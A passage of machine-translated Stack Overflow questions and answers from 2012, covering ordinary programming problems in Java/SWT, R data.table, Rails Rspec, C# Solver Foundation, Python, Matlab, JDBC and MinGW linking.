col = new TableViewerColumn(this, SWT.NONE);
  col.getColumn().setWidth(70);
  col.getColumn().setText("Print Status");
  col.setLabelProvider(new ColumnLabelProvider() {
  @Override
  public Image getImage(Object element) {
    if (((AplotResultsDataModel.ResultsData) element).isSuccess()) {
      return SUCCESS;
    } 
    return FAIL;
    }
  }); 
```

这是`getImage`方法

```
private static Image getImage(String file) {
  Bundle bundle = FrameworkUtil.getBundle(Viewer.class);
  URL url = FileLocator.find(bundle, new Path("icons/" + file), null);
  ImageDescriptor image = ImageDescriptor.createFromURL(url);
  return image.createImage();
} 
```

我尝试了两种创建图像的方法。

```
private static final Image FAIL = getImage("failed.png"); 
```

和

```
final Image FAIL = new Image(Display.getDefault() ,"D:/Users/workspace/com.aplot/icons/failed.png"); 
```

在这两种情况下，图像都会显示，但旁边有一个文本路径。路径看起来像是该列的数组值。

例子：

[图片] com.aplot.datamodel.ResultsDataModel$ResultsData@9cce9

如何删除文本并仅显示图像？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:55:14.713

覆盖`getText()`方法`ColumnLabelProvider`并返回空字符串。如果你不覆盖，它总是显示 element.toString()。这就是为什么您在那里看到数据对象的 toString() 值的原因。

# r - 在 R 的 data.table 中选择 NA

> ID：12646172
> 
> 赞同：24
> 
> 时间：2012-09-28T19:27:14.290
> 
> 标签：r, select, data.table, missing-data, na

如何选择数据表中主键中缺少值的所有行。

```
DT = data.table(x=rep(c("a","b",NA),each=3), y=c(1,3,6), v=1:9)
setkey(DT,x) 
```

选择特定值很容易

```
DT["a",] 
```

选择缺失值似乎需要向量搜索。不能使用二分查找。我对么？

```
DT[NA,]# does not work
DT[is.na(x),] #does work 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-09-28T20:01:03.087

幸运的是，`DT[is.na(x),]`几乎和 (eg) 一样快`DT["a",]`，所以在实践中，这可能并不重要：

```
library(data.table)
library(rbenchmark)

DT = data.table(x=rep(c("a","b",NA),each=3e6), y=c(1,3,6), v=1:9)
setkey(DT,x)  

benchmark(DT["a",],
          DT[is.na(x),],
          replications=20)
#             test replications elapsed relative user.self sys.self user.child
# 1      DT["a", ]           20    9.18    1.000      7.31     1.83         NA
# 2 DT[is.na(x), ]           20   10.55    1.149      8.69     1.85         NA 
```

===

马修的补充（不适合评论）：

不过，上面的数据有 3 个非常大的组。因此，二分查找的速度优势在这里主要由创建大子集的时间（1/3 的数据被复制）决定。

```
benchmark(DT["a",],  # repeat select of large subset on my netbook
    DT[is.na(x),],
    replications=3)
          test replications elapsed relative user.self sys.self
     DT["a", ]            3   2.406    1.000     2.357    0.044
DT[is.na(x), ]            3   3.876    1.611     3.812    0.056

benchmark(DT["a",which=TRUE],   # isolate search time
    DT[is.na(x),which=TRUE],
    replications=3)
                      test replications elapsed relative user.self sys.self
     DT["a", which = TRUE]            3   0.492    1.000     0.492    0.000
DT[is.na(x), which = TRUE]            3   2.941    5.978     2.932    0.004 
```

随着返回的子集的大小减小（例如添加更多组），差异变得明显。单列上的矢量扫描还不错，但在 2 列或更多列上它会迅速降级。

也许 NA 应该可以加入。不过，我似乎记得有一个问题。这是从 FR#1043 链接的一些历史记录[Allow or disallow NA in keys？](https://github.com/Rdatatable/data.table/issues/434). 它在那里提到`NA_integer_`内部是一个负整数。这会使基数/计数排序（iirc）出错，从而导致`setkey`速度变慢。但它在重新访问的列表中。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2013-12-15T01:06:41.370

## 这现在在 v1.8.11 中实现。来自[**新闻**](https://r-forge.r-project.org/scm/viewvc.php/pkg/NEWS?view=markup&root=datatable)：

> o 二分搜索现在能够对`NA`/ `NaN`s 进行子集化，并且还可以通过匹配s/ s 来执行`joins`和执行。`merges``NA``NaN`

尽管此时您必须明确提供正确的`NA`(`NA_real_`等`NA_character_`)。

关于OP的数据：

```
DT[J(NA_character_)] # or for characters simply DT[NA_character_]
#     x y v
# 1: NA 1 7
# 2: NA 3 8
# 3: NA 6 9 
```

* * *

此外，这是来自@JoshOBrien 帖子的相同基准，添加了对 NA 的二进制搜索：

```
library(data.table)
library(rbenchmark)

DT = data.table(x=rep(c("a","b",NA),each=3e6), y=c(1,3,6), v=1:9)
setkey(DT,x)  

benchmark(DT["a",],
          DT[is.na(x),],
          DT[NA_character_], 
          replications=20)

            test replications elapsed relative user.self sys.self
1      DT["a", ]           20   4.763    1.238     4.000    0.567
2 DT[is.na(x), ]           20   5.399    1.403     4.537    0.794
3         DT[NA]           20   3.847    1.000     3.215    0.600 # <~~~ 
```

# ruby-on-rails - 对象属性唯一性的 Rspec 测试失败，未定义方法“有效？” 对于零：NilClass

> ID：12646174
> 
> 赞同：0
> 
> 时间：2012-09-28T19:27:41.943
> 
> 标签：ruby-on-rails, rspec, factory-bot, rspec-rails, validates-uniqueness-of

我有一个名为“Charity”的对象，我想确保每个慈善机构都有一个唯一的名称，不幸的是我得到了以下失败的测试，我怀疑这是我的工厂的问题：

```
Failures
     1) Charity name is already taken
       Failure/Error: it { @charity_with_same_name.should_not be_valid }
       NoMethodError:
         undefined method 'valid?' for nil:NilClass
       ... 
```

慈善对象属于用户对象。这是charity.rb：

```
class Charity < ActiveRecord::Base
  attr_accessible :name, :description, :summary
  belongs_to :user

  validates :name, presence: true, uniqueness: { case_sensitive: false }, length: { maximum: 40 }
  validates :summary, presence: true, length: { maximum: 140 }
  validates :description, presence: true
  validates :user_id, presence: true

  default_scope order: 'charities.created_at DESC'
end 
```

以下是charity_spec.rb 的相关部分：

```
require 'spec_helper'

describe Charity do

  let(:user) { FactoryGirl.create(:user) }
  #before { @charity = user.charities.build(summary: "Lorem ipsum") }
  before { @charity = user.charities.build(FactoryGirl.attributes_for(:charity)) }
  # this makes sure that all the attributes for charity are set, whereas
  #the previous code only sets the "summary" attribute

  subject { @charity }
  ...
  describe "name is already taken" do
    before do
      charity_with_same_name = @charity.dup
      charity_with_same_name.name = @charity.name.upcase
      charity_with_same_name.save
    end

    it { @charity_with_same_name.should_not be_valid }
  end
  ... 
```

这是 factory.rb：

```
FactoryGirl.define do
  factory :user do
    sequence(:name)  { |n| "Person #{n}" }
    sequence(:email) { |n| "person_#{n}@example.com" }   
    password "foobar"
    password_confirmation "foobar"
    ...

    factory :charity do
      sequence(:name)        { |n| "charity #{n}" }
      sequence(:summary)     { |n| "summary #{n}" }
      sequence(:description) { |n| "description #{n}" }
    end
end 
```

我做错什么了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T19:53:12.420

您可以`charity_with_same_name`在 before 块中创建一个实例变量（更改`charity_with_same_name`为`@charity_with_same_name`），然后更改`it { @charity_with_same_name.should_not be_valid }`为`specify { @charity_with_same_name.should_not be_valid }`以使其通过。

The issue is that `@charity_with_same_name` doesn't exist, because you haven't initialized it. You have only set up `charity_with_same_name`. Also, because of `subject { @charity }`, `it` refers to `@charity`, so `it { @charity_with_same_name.should_not be_valid }` doesn't make sense here.

EDIT: In ADDITION to doing the above, you'll need to add the line `@charity.save` in the `before` block (right before the line `charity_with_same_name = @charity.dup`). This is necessary because your duplicated record will pass the validation (when it shouldn't) despite the fact that it has the same name as `@charity` because `@charity` was not yet saved to the database. Once charity is saved, the validation test will check the database and see that the name has already been taken.

# c# - 将 MS Solver Foundation 与矩阵乘法结合使用

> ID：12646175
> 
> 赞同：2
> 
> 时间：2012-09-28T19:27:44.410
> 
> 标签：c#, matrix, ms-solver-foundation

我正在尝试使用[Microsoft Solver Foundation](http://archive.msdn.microsoft.com/solverfoundation)来优化我遇到的涉及矩阵乘法的问题。我可以使用 Excel 的求解器来做到这一点，但我正在尝试将它集成到 C# 中并且遇到了麻烦。下面是一个例子的描述：

假设您有一个 (3x3) 矩阵**y**，定义为：

```
Double[][] y = 
{
    new Double[] { 5, 1, 0 },
    new Double[] { 1, 9, 1 },
    new Double[] { 0, 1, 9 },
}; 
```

我想找到 (1x3) 矩阵**x**使得：`x * y * x'`最小化。此外，**x**值的总和必须为 1，并且任何**x**值都不能小于 0。

这是我到目前为止的代码：

```
 SolverContext context = SolverContext.GetContext();             // Get context environment
 Model model = context.CreateModel();                            // Create a new model

 Decision d1 = new Decision(Domain.RealNonnegative, "d1");       // First item in "x" vector (must be >= 0)
 Decision d2 = new Decision(Domain.RealNonnegative, "d2");       // Second item in "x" vector (must be >= 0)
 Decision d3 = new Decision(Domain.RealNonnegative, "d3");       // Third item in "x" vector (must be >= 0)
 model.AddDecisions(d1, d2, d3);                                 // Add these to the model (this is where the outputs will be stored)

 model.AddConstraints("limits",                                  // Add constraints
     0 <= d1 <= 1,                                               // Each item must be between 0 and 1
     0 <= d2 <= 1,
     0 <= d3 <= 1,
     d1 + d2 + d3 == 1);                                         // All items must add up to 1 
```

我坚持的部分是当你告诉它你想要最小化的内容时：

```
 model.AddGoal("min", GoalKind.Minimize, /* What goes here? */); 
```

这部分通常包含一个方程（例如`d1 * d2 + d3`），但矩阵乘法并不是那么简单。

我可以创建一个执行乘法并返回 a 的函数`double`，但`AddGoal()`需要一个[Term](http://msdn.microsoft.com/en-us/library/microsoft.solverfoundation.services.term%28v=vs.93%29.aspx)对象，而且我还必须对`Decision`对象进行算术运算。

或者，我可以将这个乘法分解为一个巨大的`string`表达式（我已经完成了），但如果我不必这样做，我会更喜欢。（这个字符串看起来像`"d1 * 5 + d2 * 1 + d3 * 0 ..."`：）

有任何想法吗？谢谢。

PS：正确答案（根据Excel）是：

```
d1 = 0.503497
d2 = 0.216783
d3 = 0.27972 
```

注意：解决方案必须具有可扩展性以具有`n`“决策”数量

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-21T22:33:12.730

以下产生预期的解决方案：

```
using System;
using Microsoft.SolverFoundation.Services;

namespace akMSFStackOverflow
{
    class Program
    {
        static void Main(string[] args)
        {
            Double[,] y = 
            {
                { 5, 1, 0 },
                { 1, 9, 1 },
                { 0, 1, 9 },
            };

            Term goal;
            Term[,] tx;
            Term[,] ty;

            SolverContext context = SolverContext.GetContext();             // Get context environment
            Model model = context.CreateModel();                            // Create a new model

            Decision d1 = new Decision(Domain.RealNonnegative, "d1");       // First item in "x" vector (must be >= 0)
            Decision d2 = new Decision(Domain.RealNonnegative, "d2");       // Second item in "x" vector (must be >= 0)
            Decision d3 = new Decision(Domain.RealNonnegative, "d3");       // Third item in "x" vector (must be >= 0)
            model.AddDecisions(d1, d2, d3);                                 // Add these to the model (this is where the outputs will be stored)

            model.AddConstraints("limits",                                  // Add constraints
                0 <= d1 <= 1,                                               // Each item must be between 0 and 1
                0 <= d2 <= 1,
                0 <= d3 <= 1,
                d1 + d2 + d3 == 1);                                         // All items must add up to 1

            ty = matrix(y);
            tx = new Term[,] { { d1, d2, d3 } };

            goal = matMult(matMult(tx, ty), transpose(tx))[0, 0];

            model.AddGoal("goal", GoalKind.Minimize, goal);

            // Specifying the IPM solver, as we have a quadratic goal 
            Solution solution = context.Solve(new InteriorPointMethodDirective());

            Report report = solution.GetReport();
            Console.WriteLine("x {{{0}, {1}, {2}}}", d1, d2, d3);
            Console.Write("{0}", report); 

        }

        static Term[,] matrix(Double[,] m)
        {
            int rows = m.GetLength(0);
            int cols = m.GetLength(1);
            Term[,] r = new Term[rows, cols];

            for (int row = 0; row < rows; row++)
                for (int col = 0; col < cols; col++)
                    r[row, col] = m[row, col];

            return r;
        }

        static Term[,] matMult(Term[,] a, Term[,] b)
        {
            int rows = a.GetLength(0);
            int cols = b.GetLength(1);
            Term[,] r = new Term[rows, cols];

            for (int row = 0; row < rows; row++)
                for (int col = 0; col < cols; col++)
                {
                    r[row,col] = 0;
                    for (int k = 0; k < a.GetLength(1); k++)
                    {
                        r[row, col] += a[row, k] * b[k, col];
                    }
                }

            return r;
        }

        static Term[,] transpose(Term[,] m)
        {
            int rows = m.GetLength(0);
            int cols = m.GetLength(1);
            Term[,] r = new Term[cols, rows];

            for (int row = 0; row < rows; row++)
                for (int col = 0; col < cols; col++)
                {
                    r[col, row] = m[row, col];
                }

            return r;
        }
    }
} 
```

# python - 将 ' 更改为普通字符

> ID：12646177
> 
> 赞同：13
> 
> 时间：2012-09-28T19:27:58.687
> 
> 标签：python, html, character-encoding

我无法显示内容，我的程序：

```
#! /usr/bin/python

import urllib
import re

url = "http://yahoo.com"
pattern = '''<span class="medium item-label".*?>(.*)</span>'''

website = urllib.urlopen(url)
pageContent = website.read()
result = re.findall(pattern, pageContent)

for record in result:
    print record 
```

输出：

```
Masked teen killed by dad
First look in &#39;Hotel of Doom&#39;
Ex-NFL QB&#39;s sad condition
Reporter ignores warning
Romney&#39;s low bar for debates 
```

所以问题是我应该在我的代码中包含什么才能将 ' 转换为字符

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-28T19:30:05.833

在 Python2 中：

```
In [16]: text = 'Ex-NFL QB&#39;s sad condition'

In [17]: import HTMLParser

In [18]: parser = HTMLParser.HTMLParser()

In [19]: parser.unescape(text)
Out[19]: u"Ex-NFL QB's sad condition" 
```

在 Python3 中：

```
import html.parser as htmlparser
parser = htmlparser.HTMLParser()
parser.unescape(text) 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2019-02-13T18:34:28.123

Python 3 的解决方案，

```
import html
html.unescape(text) 
```

# matlab - 执行忽略零元素的公式

> ID：12646180
> 
> 赞同：2
> 
> 时间：2012-09-28T19:28:26.570
> 
> 标签：matlab

我想通过忽略零元素在矩阵上运行快速的 Matlab 算法。

过去我只使用了一个非常慢的双循环，例如

```
for i = 1 : size(x,1)
   for j = 1 : size(x,2)
        if x(i,j) ~= 0
            ... do something with x(i,j)
        end
     end
end 
```

但是我怎样才能对整个矩阵 x 进行矩阵运算呢？例如，我该如何运行

```
x(i,j) = log(x(i,j)) if x>0 else 0    <-- pseudo code 
```

在没有for循环的整个矩阵上的Matlab？

最后我想重写像

```
result = sum(sum((V.*log(V./(W*H))) - V + W*H)); 
```

忽略零。

我只需要理解这个概念。如果需要，我也可以使用 NaN 而不是零，但我没有找到例如函数

```
nanlog() 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T19:32:12.073

`x~=0`返回不等于零的位置索引。然后，您可以使用它们来索引相应的位置，`x`如下所示：

```
>> x = [1 0 2 3; 0 4 0 5]
x =
     1     0     2     3
     0     4     0     5

>> mean(x(:)) %#mean of all elements
ans =
    1.8750

>> mean(x(x~=0)) %#mean of nonzero elements
ans =
     3

>> x(x~=0) = x(x~=0) + 1
x =
     2     0     3     4
     0     5     0     6 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-28T20:13:20.500

您可以将`NaN`其用作临时对象并利用以下事实`log(NaN) = NaN`：

```
x(x==0) = NaN;
y = log(x);
y(isnan(y)) = 0; 
```

或者，您可以使用逻辑索引：

```
x(x~=0) = log(x(x~=0)); 
```

或者，如果您想保留`x`，

```
y = x;
y(y~=0) = log(y(y~=0)); 
```

对于您提供的示例，您可以这样做

```
result = nansum(nansum((V.*log(V./(W*H))) - V + W*H)); 
```

假设这`V == 0`是问题所在。

# ruby-on-rails - Omniauth 总是重定向到 /sign_up#_=_

> ID：12646184
> 
> 赞同：0
> 
> 时间：2012-09-28T19:28:40.527
> 
> 标签：ruby-on-rails, ruby-on-rails-3, omniauth

> **可能重复：**
> [# *=*由 facebook 添加到 URL](https://stackoverflow.com/questions/8362681/added-to-url-by-facebook)

我对 Omniauth + Facebook 有疑问。我已经按照[此](https://github.com/plataformatec/devise/wiki/OmniAuth:-Overview)wiki 页面上的描述完成了所有操作，当我点击“使用 Facebook 登录”按钮时，omniauth 总是将我重定向到`http://domain/sign_up#_=_`，无论用户是否存在于数据库中（我的意思是，用户的电子邮件地址从脸书 api)。

我不确定哪些代码对您调试我的问题有用，因为我需要承认这整个 oauth 事情对我来说似乎有点神奇。它可能与`find_for_facebook_oauth()`功能有关，因为该功能负责检查用户是否存在于数据库中。但是，即使查看它的代码，我也无法看到问题所在。

您能否告诉我可能是什么原因，或者只是告诉我您需要检查哪些文件或功能才能了解更多信息？

* * *

**我不确定为什么这个问题被标记为重复并关闭。您是否阅读过问题正文或只是标题？**

# java - Java中的向量距离计算-优化

> ID：12646186
> 
> 赞同：3
> 
> 时间：2012-09-28T19:28:42.290
> 
> 标签：java, optimization

作为图像处理功能的一部分，我需要计算图像中两条线之间的平方和。

这部分代码占用了 96% 的运行时间：

```
for(int dx=0;dx<size;dx++) {
    int left = a[pa+dx];
    int right = b[pb+dx];
    int diff = (left & 0xFF) - (right & 0xFF);
    sum += diff*diff;
} 
```

在哪里：

*   `a`,`b`是类型`byte[]`
*   `sum`是`long`
*   `size`是`int`并且通常具有很大的值（大约 400）

运行 Java 7 64 位。我试图用 性能不是更好的`a[pa+dx]`东西来代替。`a[pa++]`

完全相同的用 C++ 编写的代码完全保存运行速度总体快了两倍（！），据我所知，应该没有重要的原因为什么这个 Java 代码不会那么快，特别是当边界检查可以移出时编译器的循环。

如何优化这些东西以像 C++ 代码一样执行 - 最后它是整数运算，它在 Java 中应该不会慢很多

编辑：C++ 示例如下所示：

```
unsigned char const *srcptr=&a[pa];
unsigned char const *tgtptr=&b[pb];
for(int dx=0;dx < size;dx++) {
    int p1=*srcptr++;
    int p2=*tgtptr++;
    int diff = p1 - p2;
    sum += diff * diff;
} 
```

我想了解如何使 HotSpot 优化器创建与上面显示的 C++ 代码一样快的代码，最后优化行非常简单易行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:36:40.607

它很小，但您不需要`& 0xFF`计算差异：*差异*将是相同的有符号或无符号。

```
100 - -1 = 101  // signed
228 - 127 = 101 // unsigned 
```

然后它将是更紧密的循环体：

```
for (int dx = 0; dx < size; dx++) {
    int diff = a[pa+dx] - b[pb+dx];
    sum += diff*diff;
} 
```

### 编辑：

关于有符号与无符号字节算术似乎有些混淆。如果您怀疑它们是否相同，请执行以下操作：

```
byte a = -128;
byte b = 127;
int diff = a - b;
System.out.println(diff); // -255

a = 127;
b = -128;
diff = a - b;
System.out.println(diff); // 255 
```

diff值的范围大于（-128..127）的*原因是java在计算**之前*自动扩大到，因为目标变量是一个.`byte``byte``int` *`int`*

 ** * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T11:15:55.203

在我使用不同的 C++ 编译器和不同的 Java 版本测试了相同的算法之后，我必须得出结论，GCC 是**非常**好的编译器，它比 intel 和 clang 更好地优化了代码！

这些是在 C++ 和 Java 中实现的相同算法的运行时间（当上面的行是运行时间的 96% 时：

```
Intel 12.1  1:58
GCC 4.6     0:43
GCC 4.4     0:43
Clang       1:20
Java 7      1:20
Java 6      1:23 
```

这表明 Java 的运行速度与 clang 一样快，而英特尔编译器由于某种原因做得非常糟糕，但是 gcc 给出了最好的结果，所以我真的不能指望 Java 比大多数 C++ 编译器运行得更快。

请注意，这是 gcc 生成的程序集：

```
.L225:
    movzbl  (%rcx), %r8d
    movzbl  (%rsi), %r10d
    addl    $1, %edx
    addq    $1, %rcx
    addq    $1, %rsi
    subl    %r10d, %r8d
    imull   %r8d, %r8d
    movslq  %r8d, %r8
    addq    %r8, %rax
    cmpl    %edx, %ebp
    ja      .L225 
```

而这个由clang生成：

```
.LBB0_26:
    movzbl  (%r11), %r13d
    movzbl  (%r14), %esi
    subl    %r13d, %esi
    imull   %esi, %esi
    movslq  %esi, %rsi
    addq    %rsi, %rcx
    incq    %r11
    incq    %r14
    decq    %r12
    jne     .LBB0_26 
```

有什么不同？GCC 重新排列指令，以便它们可以在管道中并行运行，例如：

```
 movzbl  (%rcx), %r8d
    movzbl  (%rsi), %r10d
    addl    $1, %edx
    addq    $1, %rcx
    addq    $1, %rsi 
```

最重要的是，Java 运行时间很好。

**编辑：**在为 Intel 编译器提供`-xHost`选项后（针对当前 CPU 进行优化），运行时间提高到 56 秒（使用 mmx 指令），但仍然不如 gcc，但比 Java 好一点

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-29T12:50:32.437

将`& 0xFF`' 移到循环外。

通过计算`int[]`两者的版本来做到这一点，`a`并`b`使用这些重写你的循环。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-28T22:35:17.187

如果数组 a 或 b 的大小为“size”，则可以避免 for 条件：

```
try{
    for (int dx = 0; ; dx++) {
        ...
        ...
    }
}catch(ArrayIndexOutOfBoundException e){} 
```

两条线是直的还是弯的？您可以发布问题的图形表示，还是数组的数字示例？也许有更好的几何解决方案？*

# asp.net-mvc-3 - DotNetOpenAuth 4.0 和 HTTPRequestInfo、NerdDinner 2.0

> ID：12646187
> 
> 赞同：0
> 
> 时间：2012-09-28T19:28:43.913
> 
> 标签：asp.net-mvc-3, dotnetopenauth, nerddinner

我使用 NerdDinner 2.0 作为学习 DotNetOpenAuth 的基础。顺便说一句，伟大的项目。我使用基于运行时版本 v2.0.50727（随项目提供）构建的 DotNetOpenAuth DLL 使其工作。我想升级到基于运行时版本 v4.0.20926 构建的 DotNetOpenAuth DLL，但在 AuthController.cs 文件中出现以下编译时错误...

```
HttpRequestInfo clientResponseInfo = new HttpRequestInfo("GET", auth, auth.PathAndQuery, headers, null); 
```

例外：

> DotNetOpenAuth.Messaging.HttpRequestInfo 不包含采用 5 个参数的构造函数。

显然我不知道 v4.0.20926 中的等效代码是什么。任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T21:52:23.453

尝试将其替换为：

```
HttpRequestBase clientResponesInfo = HttpRequestInfo.Create("GET", auth, headers, null); 
```

# java - 在arraylist中膨胀添加新元素时出错

> ID：12646188
> 
> 赞同：-1
> 
> 时间：2012-09-28T19:28:49.810
> 
> 标签：java, android, listview

我正在尝试在每一行中实际实现一个具有不同布局的列表视图。我坚持这一点。我收到与该部分`rows.add(new ImageRow(LayoutInflater.from(FeedAdapter.this), feed));`相同的错误。`descriptionRow`

```
final List<Row> rows;
FeedAdapter(List<Feed> feeds) {
    rows = new ArrayList<Row>();//member variable

    for (Feed feed : feeds) {
        //if it has an image, use an ImageRow
        if (feed.getImageID() != null) {
           rows.add(new ImageRow(LayoutInflater.from(FeedAdapter.this), feed));
        } else {//otherwise use a DescriptionRow
            rows.add(new DescriptionRow(LayoutInflater.from(FeedAdapter.this), feed));
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-28T19:58:11.903

`rows`是`final`。我不确定你是否可以在它有价值后继续添加它。`final`意味着一旦你设置了值，你就不想改变它。不带试试`final`。

# java - 将数据更新到 mysql 数据库中的表失败

> ID：12646189
> 
> 赞同：0
> 
> 时间：2012-09-28T19:28:52.833
> 
> 标签：java, mysql, netbeans, jdbc

以下代码没有显示任何错误并且代码执行但计算并存储在 rfv 中的数据未在数据库中更新。

```
try{
  Class.forName("com.mysql.jdbc.Driver").newInstance();
  com.mysql.jdbc.Connection con = (com.mysql.jdbc.Connection)  DriverManager.getConnection("jdbc:mysql://localhost:3308/rk","root","root");
  ResultSet rsfact=null;
  PreparedStatement psfact=(PreparedStatement) con.prepareStatement("SELECT * FROM fact");
  PreparedStatement psgraph=(PreparedStatement) con.prepareStatement("INSERT INTO graph values(?,?,?,?)");
  int cp,ic,rc,fi,ct,tr;
  while(rsfact.next())
  {
      cp=rsfact.getInt("1");
      ic=rsfact.getInt("2");
      rc=rsfact.getInt("3");
      fi=rsfact.getInt("4");
      ct=rsfact.getInt("5");
      tr=rsfact.getInt("6");
      int rfv;

      rfv=(cp+ic+rc+fi+ct+tr)/6;
      graph.setInt(1, rfv);
      graph.executeUpdate();
  }
 }
 catch(Exception e){
 System.out.println(e);
 } 
```

我检查了代码，对我来说一切似乎都很好，但我无法弄清楚未插入表中的数据的原因。执行时我得到以下信息

java.lang.NullPointerException

```
 try{
   Class.forName("com.mysql.jdbc.Driver").newInstance();
    com.mysql.jdbc.Connection con = (com.mysql.jdbc.Connection)        DriverManager.getConnection("jdbc:mysql://localhost:3308/rk","root","root");
   ResultSet rsfact=null;
  ResultSet rsfault=null;
  ResultSet rspriority=null;
  ResultSet rsreq=null;
  PreparedStatement psfact=(PreparedStatement) con.prepareStatement("SELECT * FROM fact");
  PreparedStatement psfault=(PreparedStatement) con.prepareStatement("SELECT * FROM fault");
  PreparedStatement pspriority=(PreparedStatement) con.prepareStatement("SELECT * FROM priority");
  PreparedStatement psreq=(PreparedStatement) con.prepareStatement("SELECT * FROM req");
  PreparedStatement graph=(PreparedStatement) con.prepareStatement("INSERT INTO gr values(?)");
  int cp,ic,rc,fi,ct,tr;
  rsfact = psfact.executeQuery();
  rsfault=psfault.executeQuery();
  rspriority=pspriority.executeQuery();
  rsreq=psreq.executeQuery();
  while(rsfact.next())
  {
      cp=rsfact.getInt(1);
      ic=rsfact.getInt(2);
      rc=rsfact.getInt(3);
      fi=rsfact.getInt(4);
      ct=rsfact.getInt(5);
      tr=rsfact.getInt(6);
      int rfv;

      rfv=(cp+ic+rc+fi+ct+tr)/6;
      graph.setInt(1, rfv);
      graph.executeUpdate();
  }
  while(rsfault.next()){
  cp=rsfact.getInt(1);
      fic=rsfact.getInt(2);
      frc=rsfact.getInt(3);
      ffi=rsfact.getInt(4);
      fct=rsfact.getInt(5);
      ftr=rsfact.getInt(6);
      int tsfv;

      tsfv=((fcp*2)+(fic*3)+(frc*4)+(ffi*3.14)+(fct-4)+(ftr+9))/6;
      graph.setInt(2, tsfv);
      graph.executeUpdate();

  }
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:31:45.227

您没有实例化 rsfact(ResultSet object) 并试图调用结果集的方法，因此**NULLPOINTEREXCEPTION**。

```
 ResultSet rsfact=null; // **rsfact is null**
       int colCount=1;
      PreparedStatement psfact=(PreparedStatement) con.prepareStatement("SELECT * FROM fact");
      PreparedStatement psgraph=(PreparedStatement) con.prepareStatement("INSERT INTO graph values(?,?,?,?)");
      int cp,ic,rc,fi,ct,tr;
      rsfact = psFact.executeQuery(); **// this instantiates ResultSet, if you dont includee this statement rsfact would still be null.**
while(rsfact.next()) // **if rsfact null and u execute this line it would throw nullpointer exception(cuz rsfact is null)**
  {
      cp=rsfact.getInt("1");
      ic=rsfact.getInt("2");
      rc=rsfact.getInt("3");
      fi=rsfact.getInt("4");
      ct=rsfact.getInt("5");
      tr=rsfact.getInt("6");
      int rfv;

      rfv=(cp+ic+rc+fi+ct+tr)/6;
      graph.setInt(colCount, rfv);
       colCount++;
}
      graph.executeUpdate(); 
```

# mingw - 快板 5 - MinGW + Geany

> ID：12646193
> 
> 赞同：1
> 
> 时间：2012-09-28T19:29:06.127
> 
> 标签：mingw, allegro, geany

我正在尝试将 Allegro 设置为在 Windows 的 Geany 中与 MinGW 一起使用。但是我一直遇到错误（我假设链接器错误）。这是我到目前为止所做的：

*   我已经安装了 Geany 和 MinGW。

*   [我从http://www.allegro.cc/files/](http://www.allegro.cc/files/)下载了 Allegro 5

*   我选择了 Windows Binaries 下的 Allegro MinGW 4.6.2 zip

*   我解压缩了文件（allegro-5.0.7-mingw-4.6.2）

它包含 3 个文件夹；lib、bin 和包含。

然后我将文件夹复制到我的 MinGW 安装中。更具体地说，我将 Allegro 中的 lib、bin 和 include 文件夹与我的 MinGW 安装中的 lib、bin 和 include 合并。

之后，我在 Geany 中设置了我的构建命令，如下所示：

编译： `g++ -O0 -g3 -Wall -c -o"%e.o" "%f"`

建造： `g++ -o"%e" ./%e.o -Lalleg`

执行： `"./%e"`

当我尝试构建我的项目时，我得到了一堆未定义的参考错误。对此的任何帮助都会很棒！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:02:16.733

1.  您应该使用`-l`参数而不是`-L`参数来链接静态库。`-L`参数用于输入编译器应查找的附加库路径。

2.  如您所见，“allegro-5.0.7-mingw-4.6.2”文件夹中没有“liballeg.a”文件，因此您根本没有链接。

3.  您不必将所有这些文件复制到任何地方，但您应该通过使用`-I`和`-L`参数告诉编译器它应该在哪里查找头文件和库。

假设您将“allegro-5.0.7-mingw-4.6.2.7z”提取到“allegro-5.0.7-mingw-4.6.2”文件夹。你有`lib`,`inclued`和`bin`文件夹。只需在此文件夹中创建一个文件并将其命名为“main.cpp”。

main.cpp 的内容：

```
#include <allegro5/allegro.h>

int main(){
   al_init();

   return 0;
} 
```

现在你所要做的就是，进入`allegro-5.0.7-mingw-4.6.2`

*   像这样编译 main.cpp

> g++ -c main.cpp -o main.o -I./include

*   将 main.o 与库链接：

> g++ -o main.exe main.o -L./lib -lallegro-5.0.7-md

现在你必须配置 Geany 来做同样的事情。如果将库和头文件粘贴到正确的 MinGW 文件夹中，则可以省略`-I`和参数。`-L`

# c# - 将字符串剪切为 <= 80 个字符并且必须保留单词而不剪切它们

> ID：12646197
> 
> 赞同：1
> 
> 时间：2012-09-28T19:29:25.503
> 
> 标签：c#, .net, regex

我是 C# 新手，但我需要将字符串剪切为 <= 80 个字符，并且它们必须保持单词的完整性（不剪切它们）

`Examples`

`Before:`我要求将字符串切割为 <= 80 个字符并且必须保留单词而不切割它们（长度=108）
`After:`我要求将字符串切割为 <= 80 个字符并且必须保留（长度=77）

`Before:`要求将字符串切割为 <= 80 个字符并且必须保留单词而不切割它们（长度=99）
`After:`要求将字符串切割为 <= 80 个字符并且必须保留单词（长度=78）

`Before:`我要求字符串为 <= 80 个字符并且必须保留单词而不剪切它们（长度=101）
`After:`我要求字符串为 <= 80 个字符并且必须保留单词（长度=80）

我想使用正则表达式，但我对正则表达式一无所知。对于 else-if 来说，这将是一件麻烦事。如果您能指出我可以用来创建此表达式的正确文章，我将不胜感激。

这是我想剪成一行的功能：

```
public String cutTitleto80(String s){
    String[] words = Regex.Split(s, "\\s+");
    String finalResult = "";
    foreach (String word in words)
    {
        String tmp = finalResult + " " + word;
        if (tmp.Length > 80)
        {
            return finalResult;
